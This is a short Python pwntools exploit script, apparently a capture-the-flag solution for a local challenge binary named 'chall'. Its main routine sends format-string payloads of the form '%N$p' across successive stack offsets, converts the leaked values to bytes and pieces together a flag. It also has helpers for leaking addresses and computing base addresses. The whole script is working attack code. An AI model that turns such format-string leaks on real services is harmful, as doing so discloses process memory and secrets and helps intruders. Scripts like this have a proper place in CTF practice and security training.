#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

if not args.REMOTE:
    libc = exe.libc

HOST, PORT = "localhost", 3000

context.binary = exe
context.terminal = ["tmux", "splitw", "-h", "-p", "75"]

# Constants

GDBSCRIPT = '''\
'''
CHECKING = True
FLAG_OFFSET = 14

# Lambdas

b = lambda s: s.encode()

def main():
    global io

    io = conn()

    io.recvline()

    i = FLAG_OFFSET
    flag = b""
    while True:
        payload = b(f"%{i}$p|")
        sendp(payload)
        data = p64(int(io.recvuntil(b"|", drop=True), 16))
        flag += data
        if b"\0" in data:
            flag = flag.strip(b"\0").strip().decode()
            break
        i += 1
    log.success(f"Flag: {flag}")

    io.interactive()

def sendp(payload):
    check(len(payload) < 0x40)
    io.recvuntil(b"> ")
    io.sendline(payload)

def leak(buf, offset, leaktype, verbose=False):
    verbose and log.info(f"buf: {buf}")
    leak_addr = unpack(buf.ljust(context.bytes, b"\x00"))
    base_addr = leak_addr - offset
    verbose and log.info(f"{leaktype} leak: {leak_addr:#x}")
    log.success(f"{leaktype} base address: {base_addr:#x}")
    return base_addr

def stop():
    io.interactive()
    io.close()
    exit(1)

def check(predicate, disabled=False):
    if not disabled and CHECKING:
        assert(predicate)

def conn():
    if args.REMOTE:
        p = remote(HOST, PORT)
    elif args.GDB:
        p = gdb.debug(exe.path, gdbscript=GDBSCRIPT)
    else:
        p = process(exe.path)

    return p

if __name__ == "__main__":
    io = None
    try:
        main()
    finally:
        if io:
            io.close()
